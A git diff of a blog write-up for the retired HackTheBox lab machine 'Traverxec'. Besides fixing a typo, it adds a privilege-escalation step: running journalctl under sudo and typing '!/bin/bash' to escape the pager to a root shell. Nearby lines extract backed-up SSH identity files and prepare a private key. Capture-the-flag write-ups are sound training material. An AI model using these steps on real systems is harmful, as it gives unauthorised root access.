@@ -2,7 +2,7 @@
 title: "Traverxec"
 collection: publications
 permalink: /publication/traverxec
-excerpt: 'This is a retir machine from HackTheBox'
+excerpt: 'This is a retired machine from HackTheBox'
 date: 2023-08-03
 venue: '08-03'
 #paperurl: 'http://academicpages.github.io/files/paper1.pdf'
@@ -117,7 +117,7 @@ homedirs_public public_www
 * Since it's a tar archive, let's use ``tar`` command to extract it.
 
 ```bash
-#tar -xvf backup-ssh-identity-files.tgz
+# tar -xvf backup-ssh-identity-files.tgz
 ```
 
 ![traverexec4](/images/traverexec4.png)
@@ -162,6 +162,18 @@ chmod 400 id_rsa
 ```bash
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 ```
+
+![traverexec9](/images/traverexec9.png)
+
+* Enter the following command : 
+
+```bash
+!/bin/bash
+```
+
+![traverexec10](/images/traverexec10.png)
+
+
 
 
 
